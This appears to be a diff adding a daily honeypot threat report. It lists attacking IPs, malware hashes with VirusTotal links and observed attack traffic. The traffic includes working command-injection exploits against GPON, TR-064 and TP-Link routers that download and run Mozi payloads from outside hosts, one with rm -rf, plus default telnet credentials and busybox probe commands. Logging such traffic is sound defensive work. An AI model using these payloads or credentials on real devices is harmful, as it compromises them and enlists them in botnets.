@@ -1,0 +1,65 @@
+Top 5 IPs for 2024-05-05 :
+
+139.59.36.54
+182.155.43.159
+94.130.86.194
+185.220.101.96
+117.212.52.59
+
+
+Malware Download:
+
+94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+https://www.virustotal.com/gui/file/94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+3bada3c0791ba422254da6937b909e666cc5951a65824c96e54a2c9962ddaec6
+https://www.virustotal.com/gui/file/3bada3c0791ba422254da6937b909e666cc5951a65824c96e54a2c9962ddaec6
+ccbdf9fd26f26c5f686cc889cdf9279d2ef656197d76d5ea65015b50ccc98bae
+https://www.virustotal.com/gui/file/ccbdf9fd26f26c5f686cc889cdf9279d2ef656197d76d5ea65015b50ccc98bae
+dba8d72d7bd9ccd4a250cdd81cd48532e810e978e45dc8b7c409d87e012582a1
+https://www.virustotal.com/gui/file/dba8d72d7bd9ccd4a250cdd81cd48532e810e978e45dc8b7c409d87e012582a1
+ea8ff1c843a5077a73816e44527c5ae21e29bf3a9efee662ce460e0e6d0aa871
+https://www.virustotal.com/gui/file/ea8ff1c843a5077a73816e44527c5ae21e29bf3a9efee662ce460e0e6d0aa871
+
+
+Commands/exploits observed:
+
+POST /GponForm/diag_Form?images/ HTTP/1.1
+Host: 127.0.0.1:8080
+Connection: keep-alive
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: Hello, World
+Content-Length: 118
+
+XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://42.238.253.108:55260/Mozi.m+-O+->/tmp/gpon8080;sh+/tmp/gpon8080&ipv=0
+
+
+
+POST /UD/act?1 HTTP/1.1
+Host: 127.0.0.1:7574
+User-Agent: Hello, world
+SOAPAction: urn:dslforum-org:service:Time:1#SetNTPServers
+Content-Type: text/xml
+Content-Length: 640
+
+<?xml version=\"1.0\"?><SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><SOAP-ENV:Body><u:SetNTPServers xmlns:u=\"urn:dslforum-org:service:Time:1&qu ot;><NewNTPServer1>`cd /tmp && rm -rf * && /bin/busybox wget http://115.60.202.57:42846/Mozi.m && chmod 777 /tmp/tr064 && /tmp/tr064 tr064`</NewNTPServer1><NewNTPServer2>`echo DEATH`</NewNTPServer2><NewNTPServer3>`echo DEATH`</NewNTPServer3><NewNTPServer4>`echo DEATH`</NewNTPServer4><NewNTPServer5>`echo DEATH`</NewNTPServer5></u:SetNTPServers></SOAP-ENV:Body></SOAP-ENV:Envelope>
+
+
+/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+wget+http%3A%2F%2F38.45.200.163%2Fsh+%3B+chmod+777+sh%3B+.%2Fsh+tplink%3B+rm+-rf+sh)
+
+admin
+...ipcam_rt5350
+guest
+...guest
+default
+...antslq
+root
+...aquario
+enable
+system
+shell
+sh
+cat /proc/mounts; /bin/busybox NHWWM
+cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox NHWWM
+tftp; wget; /bin/busybox NHWWM
+dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
